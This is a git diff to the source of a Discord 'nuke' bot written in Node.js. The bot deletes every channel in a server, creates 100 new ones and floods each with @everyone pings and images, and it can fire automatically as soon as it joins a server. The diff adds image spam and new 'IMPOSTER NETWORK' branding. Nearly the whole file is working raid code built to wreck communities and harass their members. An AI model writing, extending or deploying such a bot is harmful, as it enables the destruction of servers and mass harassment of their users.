@@ -1,4 +1,4 @@
-// index.js - ULTRA FAST DISCORD NUKE BOT - NO CONFIRMATION, 100 CHANNELS, 1000 @everyone MESSAGES
+// index.js - ULTRA FAST DISCORD NUKE BOT WITH IMAGE SPAM
 require('dotenv').config();
 const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js');
 const express = require('express');
@@ -40,9 +40,10 @@ app.get('/', (req, res) => {
                 <div class="stats">
                     <h2 class="blink">✅ BOT OPERATIONAL</h2>
                     <p>🔥 <span class="counter">100 CHANNELS</span> 🔥</p>
-                    <p>⚡ <span class="counter">1000 @EVERYONE MESSAGES</span> ⚡</p>
-                    <p>💀 NO CONFIRMATION - INSTANT NUKE</p>
-                    <p>⚡ By: Rick Ser</p>
+                    <p>⚡ <span class="counter">1000 MESSAGES INCOMING</span> ⚡</p>
+                    <p>🖼️ <span class="counter">SINGLE CHANNEL MASSACRE</span> 🖼️</p>
+                    <p>💀 ANDI NEWTONTE AMMEDA VAYIL</p>
+                    <p>⚡ By: DICK BY IMPOSTER NETWORK</p>
                     <p>📊 Command: <span style="color: #ff0000">!nuke</span></p>
                 </div>
             </body>
@@ -86,7 +87,7 @@ client.once('ready', () => {
     console.log(colors.red('██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔════╝╚══██╔══╝'));
     console.log(colors.red('██║   ██║██║     ██║   ██████╔╝███████║    █████╗  ██║  ██║███████╗   ██║   '));
     console.log(colors.red('██║   ██║██║     ██║   ██╔══██╗██╔══██║    ██╔══╝  ██║  ██║╚════██║   ██║   '));
-    console.log(colors.red('╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ██║     ╚█████╔╝███████║   ██║   '));
+    console.log(colors.red('╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ██║     ╚█████╔╝███████╗   ██║   '));
     console.log(colors.red(' ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝      ╚════╝ ╚══════╝   ╚═╝   '));
     console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
     console.log(colors.green(`✅ BOT: ${client.user.tag}`));
@@ -95,6 +96,11 @@ client.once('ready', () => {
     console.log(colors.cyan(`⚡ CHANNELS TO CREATE: ${config.channelsToCreate}`));
     console.log(colors.magenta(`🔥 MESSAGES PER CHANNEL: ${config.messagesPerChannel}`));
     console.log(colors.blue(`💬 TOTAL @everyone SPAM: ${config.channelsToCreate * config.messagesPerChannel}`));
+    console.log(colors.yellow(`🖼️ IMAGE SPAM: ACTIVE`));
+    console.log(colors.red(`🔥 1000 MESSAGES INCOMING`));
+    console.log(colors.red(`⚡ SINGLE CHANNEL MASSACRE`));
+    console.log(colors.red(`💀 ANDI NEWTONTE AMMEDA VAYIL`));
+    console.log(colors.red(`💀 BY: DICK BY IMPOSTER NETWORK`));
     console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
 
     // Rotating Status
@@ -114,7 +120,7 @@ client.on('guildCreate', async (guild) => {
     if (!config.autoNukeOnJoin) return;
     
     console.log(colors.red(`[!] AUTO-NUKE: Joined ${guild.name}`));
-    await delay(1000); // Small delay to ensure permissions
+    await delay(1000);
     await executeNuke(guild);
 });
 
@@ -126,31 +132,27 @@ client.on('messageCreate', async (message) => {
     const args = message.content.slice(config.prefix.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // !nuke - INSTANT NO CONFIRMATION
     if (command === 'nuke') {
         console.log(colors.red(`[NUKE] Triggered by ${message.author.tag} in ${message.guild.name}`));
         
-        // Optional: Check admin (remove these 3 lines if you want anyone to use it)
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply('❌ Admin only!');
         }
         
-        // INSTANT NUKE - NO QUESTIONS ASKED
-        await message.reply('💀 **INSTANT NUKE ACTIVATED** 💀\nDeleting all channels...');
+        await message.reply('💀 **INSTANT NUKE ACTIVATED** 💀\n🔥 1000 MESSAGES INCOMING...');
         await executeNuke(message.guild);
         return;
     }
 
-    // !help - Quick help
     if (command === 'help') {
         const helpEmbed = {
             color: 0xff0000,
             title: '💀 ULTRA FAST NUKE BOT 💀',
-            description: '**100 CHANNELS | 1000 @everyone SPAM**',
+            description: '**100 CHANNELS | 1000 MESSAGES INCOMING | SINGLE CHANNEL MASSACRE**',
             fields: [
                 {
                     name: '!nuke',
-                    value: '💥 INSTANT - Deletes ALL channels, creates 100 IMPOSTER-network channels, spams 10 @everyone messages in each',
+                    value: '💥 INSTANT - Deletes ALL channels, creates 100 channels, spams 1000 messages + IMAGES',
                     inline: false
                 },
                 {
@@ -159,44 +161,69 @@ client.on('messageCreate', async (message) => {
                     inline: false
                 }
             ],
-            footer: { text: 'ULTRA FAST by Rick Ser | 1000 @everyone SPAM' }
+            footer: { text: 'ANDI NEWTONTE AMMEDA VAYIL | DICK BY IMPOSTER NETWORK | x9' }
         };
         await message.channel.send({ embeds: [helpEmbed] });
         return;
     }
 });
 
-// MAIN NUKE FUNCTION - OPTIMIZED FOR MAXIMUM SPEED
+// Function to send spam messages with images and x9 - UPDATED
+async function sendSpamWithImage(channel, messageCount) {
+    const promises = [];
+    
+    for (let m = 0; m < messageCount; m++) {
+        const randomMsg = config.spamMessages[m % config.spamMessages.length];
+        
+        if (m % 2 === 0) {
+            // Send text with @everyone and x9
+            promises.push(
+                channel.send(randomMsg).catch(e => null)
+            );
+        } else {
+            // Send image with @everyone and x9 - UPDATED
+            promises.push(
+                channel.send({
+                    content: `@everyone 💀 **XPORDINTE ANDI NEWTONTE AMMEDE VAYIL** 💀 @everyone\n**x9**`,
+                    files: [config.imageUrl]
+                }).catch(e => null)
+            );
+        }
+    }
+    
+    await Promise.all(promises);
+    return messageCount;
+}
+
+// MAIN NUKE FUNCTION
 async function executeNuke(guild) {
     console.log(colors.red(`[NUKE] STARTING ULTRA FAST OPERATION in ${guild.name}`));
+    console.log(colors.red(`🔥 1000 MESSAGES INCOMING...`));
+    console.log(colors.red(`⚡ SINGLE CHANNEL MASSACRE...`));
     const startTime = Date.now();
     
     try {
-        // PHASE 1: DELETE ALL CHANNELS (SUPER FAST)
+        // PHASE 1: DELETE ALL CHANNELS
         console.log(colors.yellow(`[PHASE 1] Deleting all channels...`));
         const channels = await guild.channels.fetch();
         const channelList = Array.from(channels.values());
         
         let deleted = 0;
-        // Use Promise.all for parallel deletion where possible
         const deletePromises = channelList.map(async (channel) => {
             try {
                 await channel.delete();
                 deleted++;
                 console.log(colors.red(`[DELETE] ${channel.name}`));
-            } catch (e) {
-                // Ignore errors
-            }
+            } catch (e) {}
         });
         
         await Promise.all(deletePromises);
         console.log(colors.green(`[PHASE 1] Deleted ${deleted} channels`));
         
-        // PHASE 2: CREATE 100 CHANNELS (PARALLEL BATCHES)
+        // PHASE 2: CREATE 100 CHANNELS
         console.log(colors.yellow(`[PHASE 2] Creating ${config.channelsToCreate} channels...`));
         
         const createdChannels = [];
-        // Create in batches of 5 for speed
         for (let i = 0; i < config.channelsToCreate; i += 5) {
             const batchPromises = [];
             for (let j = 0; j < 5 && (i + j) < config.channelsToCreate; j++) {
@@ -207,7 +234,7 @@ async function executeNuke(guild) {
                     guild.channels.create({
                         name: channelName,
                         type: 0,
-                        reason: 'NUKE BY RICK SER'
+                        reason: 'ANDI NEWTONTE AMMEDA VAYIL'
                     }).then(channel => {
                         createdChannels.push(channel);
                         console.log(colors.green(`[CREATE] ${channelName}`));
@@ -216,77 +243,70 @@ async function executeNuke(guild) {
                 );
             }
             await Promise.all(batchPromises);
-            await delay(200); // Small delay between batches
+            await delay(200);
         }
         
         console.log(colors.green(`[PHASE 2] Created ${createdChannels.length} channels`));
         
-        // PHASE 3: MASS @everyone SPAM - 10 MESSAGES PER CHANNEL
-        console.log(colors.yellow(`[PHASE 3] Starting MASS @everyone SPAM...`));
+        // PHASE 3: MASS SPAM WITH IMAGES AND x9
+        console.log(colors.yellow(`[PHASE 3] Starting MASS SPAM - 1000 MESSAGES INCOMING...`));
         
         let totalMessages = 0;
-        const spamStartTime = Date.now();
         
-        // Spam in batches for MAXIMUM SPEED
         for (const channel of createdChannels) {
             try {
-                // Send 10 messages with @everyone as fast as possible
-                const spamPromises = [];
-                for (let m = 0; m < config.messagesPerChannel; m++) {
-                    const randomMsg = config.spamMessages[m % config.spamMessages.length];
-                    spamPromises.push(
-                        channel.send(randomMsg).then(() => {
-                            totalMessages++;
-                            if (totalMessages % 100 === 0) {
-                                console.log(colors.cyan(`[SPAM] ${totalMessages}/1000 messages sent`));
-                            }
-                        }).catch(e => null)
-                    );
+                await sendSpamWithImage(channel, config.messagesPerChannel);
+                totalMessages += config.messagesPerChannel;
+                
+                if (totalMessages % 100 === 0) {
+                    console.log(colors.cyan(`[SPAM] ${totalMessages}/1000 messages sent`));
                 }
                 
-                // Send all 10 messages in parallel
-                await Promise.all(spamPromises);
-                
-                // Send final embed in each channel
                 await channel.send({
+                    content: `@everyone **MASS NUKE COMPLETE** @everyone\n**x9**`,
                     embeds: [{
                         color: 0xff0000,
                         title: '💀 MASS NUKE COMPLETE 💀',
-                        description: `**100 CHANNELS | 1000 @everyone MESSAGES**`,
+                        description: `**100 CHANNELS | 1000 MESSAGES INCOMING | SINGLE CHANNEL MASSACRE**\n\n**x9**`,
                         fields: [
                             { name: 'Channels Deleted', value: `${deleted}`, inline: true },
                             { name: 'Channels Created', value: `${createdChannels.length}`, inline: true },
                             { name: 'Messages Sent', value: `${totalMessages}`, inline: true },
                             { name: '@everyone Pings', value: `${totalMessages}`, inline: true },
+                            { name: 'Images Sent', value: `${Math.floor(totalMessages / 2)}`, inline: true },
                             { name: 'Time Taken', value: `${((Date.now() - startTime)/1000).toFixed(1)}s`, inline: true },
-                            { name: 'By', value: 'Rick Ser', inline: true }
+                            { name: 'By', value: 'ANDI NEWTONTE AMMEDA VAYIL', inline: true }
                         ],
-                        footer: { text: 'IMPOSTER NETWORK' }
-                    }]
+                        footer: { text: 'DICK BY IMPOSTER NETWORK | SINGLE CHANNEL MASSACRE | x9' },
+                        image: { url: config.imageUrl }
+                    }],
+                    files: [config.imageUrl]
                 }).catch(e => null);
                 
-            } catch (e) {
-                // Ignore errors - keep spamming
-            }
+            } catch (e) {}
         }
         
         const totalTime = ((Date.now() - startTime)/1000).toFixed(1);
         
-        // FINAL LOG
         console.log(colors.rainbow('══════════════════════════════════════════════'));
         console.log(colors.red(`💀 ULTRA FAST NUKE COMPLETE!`));
         console.log(colors.yellow(`📊 FINAL STATISTICS:`));
         console.log(colors.green(`   ├─ Deleted: ${deleted} channels`));
         console.log(colors.green(`   ├─ Created: ${createdChannels.length} channels`));
-        console.log(colors.green(`   ├─ @everyone Messages: ${totalMessages}`));
+        console.log(colors.green(`   ├─ @everyone Messages: ${totalMessages}/1000`));
+        console.log(colors.green(`   ├─ Images Sent: ${Math.floor(totalMessages / 2)}`));
         console.log(colors.green(`   └─ Time: ${totalTime} seconds`));
-        console.log(colors.red(`💀 By: Rick Ser | IMPOSTER NETWORK`));
+        console.log(colors.red(`🔥 1000 MESSAGES INCOMING - COMPLETED`));
+        console.log(colors.red(`⚡ SINGLE CHANNEL MASSACRE - COMPLETED`));
+        console.log(colors.red(`💀 ANDI NEWTONTE AMMEDA VAYIL`));
         console.log(colors.rainbow('══════════════════════════════════════════════'));
         
-        // Try to send final message in first channel
         if (createdChannels.length > 0) {
             try {
-                await createdChannels[0].send(`@everyone **NUKE COMPLETE** @everyone\n**${totalMessages} @everyone messages sent in ${totalTime}s**`);
+                await createdChannels[0].send({
+                    content: `@everyone **NUKE COMPLETE** @everyone\n**${totalMessages}/1000 messages sent + ${Math.floor(totalMessages / 2)} images in ${totalTime}s**\n\n**ANDI NEWTONTE AMMEDA VAYIL**\n**x9**`,
+                    files: [config.imageUrl]
+                });
             } catch (e) {}
         }
         
@@ -295,16 +315,13 @@ async function executeNuke(guild) {
     }
 }
 
-// Utility delay
 function delay(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// Error handling
 client.on('error', console.error);
 process.on('unhandledRejection', console.error);
 
-// Login
 if (!config.token || config.token === 'YOUR_BOT_TOKEN_HERE') {
     console.log(colors.red('[ERROR] No token in config.js'));
     console.log(colors.yellow('Set DISCORD_TOKEN in .env file'));
